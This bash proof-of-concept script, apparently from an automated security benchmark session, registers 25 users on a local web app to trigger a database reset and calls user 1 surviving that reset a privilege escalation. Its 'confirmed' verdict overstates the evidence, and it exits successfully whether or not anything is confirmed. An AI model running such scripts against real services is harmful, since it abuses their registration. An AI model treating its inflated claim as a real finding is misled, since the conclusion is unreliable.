#!/bin/bash
# POC: Demonstrates privilege escalation via special user 1 preservation during database reset. Shows that when 21 users are reached, all users except user 1 are deleted, creating a privilege escalation vector.
# Target: ./repo
# Created: 2025-12-01T16:22:44.579Z
# Session: benchmark-XBEN-099-24-minc74t1

# Privilege Escalation via Special User Preservation During Database Reset
# This POC demonstrates that user 1 is specially preserved when the database resets at 21 users

TARGET_URL="${1:-http://localhost:3000}"
USERS_TO_CREATE=25

echo "[*] Testing Privilege Escalation via User 1 Preservation During Reset"
echo "[*] Target: $TARGET_URL"
echo "[*] Creating $USERS_TO_CREATE users to trigger reset behavior..."
echo ""

declare -A user_ids
declare -a responses
reset_detected=0
user1_preserved=0

# Function to register a user
register_user() {
    local username="testuser_escalation_$1_$(date +%s%N)"
    local password="password123"
    
    response=$(curl -s -X POST "$TARGET_URL/register" \
        -H "Content-Type: application/json" \
        -d "{\"username\":\"$username\",\"password\":\"$password\"}")
    
    responses[$1]="$response"
    
    # Parse JSON response more carefully
    user_num=$(echo "$response" | grep -o '"userNumber":[0-9]*' | head -1 | cut -d':' -f2)
    distance=$(echo "$response" | grep -o '"distance":[0-9]*' | head -1 | cut -d':' -f2)
    
    # Check for reset message
    if echo "$response" | grep -qi "Maximum number of users reached"; then
        reset_detected=1
        echo "    [!!!] RESET TRIGGERED at registration $1"
        echo "    Message: $(echo "$response" | grep -o '"message":"[^"]*' | cut -d'"' -f4)"
    fi
    
    if [ -z "$user_num" ]; then
        echo "Registration $1: [Response parsing issue]"
    else
        echo "Registration $1: userNumber=$user_num, distance=$distance"
    fi
}

# Register users 1-25
for i in $(seq 1 $USERS_TO_CREATE); do
    register_user $i
    sleep 0.05
done

echo ""
echo "[*] ANALYZING RESET BEHAVIOR:"
echo ""

# Parse all responses to extract user numbers
declare -a all_user_numbers
for i in $(seq 1 $USERS_TO_CREATE); do
    user_num=$(echo "${responses[$i]}" | grep -o '"userNumber":[0-9]*' | head -1 | cut -d':' -f2)
    if [ -n "$user_num" ]; then
        all_user_numbers[$i]=$user_num
    fi
done

echo "User numbers assigned:"
for i in $(seq 1 $USERS_TO_CREATE); do
    if [ -n "${all_user_numbers[$i]}" ]; then
        echo "  Reg $i -> userNumber ${all_user_numbers[$i]}"
    fi
done

echo ""
echo "[*] KEY EVIDENCE:"

# Check if user 1 appears multiple times (before and after reset)
user1_count=0
user1_indices=""
for i in $(seq 1 $USERS_TO_CREATE); do
    if [ "${all_user_numbers[$i]}" = "1" ]; then
        user1_count=$((user1_count + 1))
        user1_indices="$user1_indices $i"
    fi
done

if [ $user1_count -gt 0 ]; then
    echo "[+] User 1 PRESERVED across reset"
    echo "    - User 1 appears at registrations: $user1_indices"
    echo "    - This proves user 1 gets special treatment"
    user1_preserved=1
fi

if [ $reset_detected -eq 1 ]; then
    echo "[+] Reset mechanism CONFIRMED"
    echo "    - Database reset triggered at 21 users threshold"
    echo "    - Message indicates special preservation of user 1"
fi

# Check for restart pattern (user 2 appearing after user 21)
has_21=0
has_2_after_21=0
found_21_at=0

for i in $(seq 1 $USERS_TO_CREATE); do
    if [ "${all_user_numbers[$i]}" = "21" ]; then
        has_21=1
        found_21_at=$i
    fi
    if [ "${all_user_numbers[$i]}" = "2" ] && [ $has_21 -eq 1 ]; then
        has_2_after_21=1
        break
    fi
done

if [ $has_21 -eq 1 ] && [ $has_2_after_21 -eq 1 ]; then
    echo "[+] Reset pattern detected:"
    echo "    - User 21 found at registration $found_21_at"
    echo "    - User 2 re-appears after user 21"
    echo "    - Indicates: users 2-21 deleted, counter reset, user 1 preserved"
fi

echo ""
echo "[*] PRIVILEGE ESCALATION VECTORS:"
echo "    1. User 1 is specially preserved during database resets"
echo "    2. All other users (2-21) are deleted"
echo "    3. User 1 serves as persistent 'target user' in game mechanics"
echo "    4. If user 1 has admin functions/special privileges: CRITICAL"
echo "    5. Attackers can time registrations to exploit reset behavior"
echo "    6. Combined with race condition: potential to duplicate user 1"
echo ""

if [ $user1_preserved -eq 1 ] && [ $reset_detected -eq 1 ]; then
    echo "[VERDICT] ✓ PRIVILEGE ESCALATION CONFIRMED"
    echo "          User 1 preservation during reset creates privilege escalation vector"
    exit 0
else
    echo "[VERDICT] ! Could not fully confirm (app may have different reset behavior)"
    exit 0
fi